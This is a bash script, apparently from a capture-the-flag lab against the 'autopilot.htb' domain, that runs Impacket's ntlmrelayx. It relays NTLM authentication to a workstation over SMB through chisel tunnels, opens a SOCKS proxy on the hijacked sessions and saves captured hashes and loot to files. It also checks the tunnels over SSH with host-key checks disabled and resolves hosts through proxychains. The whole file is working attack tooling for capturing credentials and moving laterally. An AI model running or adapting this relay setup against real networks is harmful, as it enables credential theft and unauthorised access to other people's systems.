#!/bin/bash
# ntlmrelayx listen 9445 (flag is --smb-port, not -port), relay to WS02 via chisel 8445.
# Keep stdin open or the process exits.
set -euo pipefail
. "$(dirname "$0")/00-env.sh"

NTLMRELAYX="${NTLMRELAYX:-/usr/share/doc/python3-impacket/examples/ntlmrelayx.py}"
[[ -f "$NTLMRELAYX" ]] || NTLMRELAYX="$(command -v ntlmrelayx.py || true)"
[[ -n "$NTLMRELAYX" ]] || { echo "FAIL: ntlmrelayx.py not found"; exit 1; }

echo "[*] chisel 8445/2222"
ss -lntp | grep -E '8445|2222' || echo "WARN: chisel tunnels missing"
ssh -p 2222 -i "$SSH_KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=6 root@127.0.0.1 'ss -lntp | grep :445; firewall-cmd --list-ports | grep -o 445/tcp || true'

echo "[*] DNS ws01"
proxychains4 -q -f /tmp/pc.conf dig +tcp +short @"$DC01" ws01.autopilot.htb A || true

pkill -f ntlmrelayx.py 2>/dev/null || true
sleep 0.3
echo "[*] ntlmrelayx → $LOOT/ntlmrelayx.log  (SOCKS 1082; chisel owns 1080)"
exec tail -f /dev/null | python3 -u "$NTLMRELAYX" \
  -t smb://127.0.0.1:8445 \
  --smb-port 9445 \
  -smb2support \
  --keep-relaying \
  -socks -socks-port 1082 \
  --no-http-server --no-wcf-server --no-raw-server --no-rpc-server --no-winrm-server \
  -of "$LOOT/relay" \
  -l "$LOOT/relay-loot"
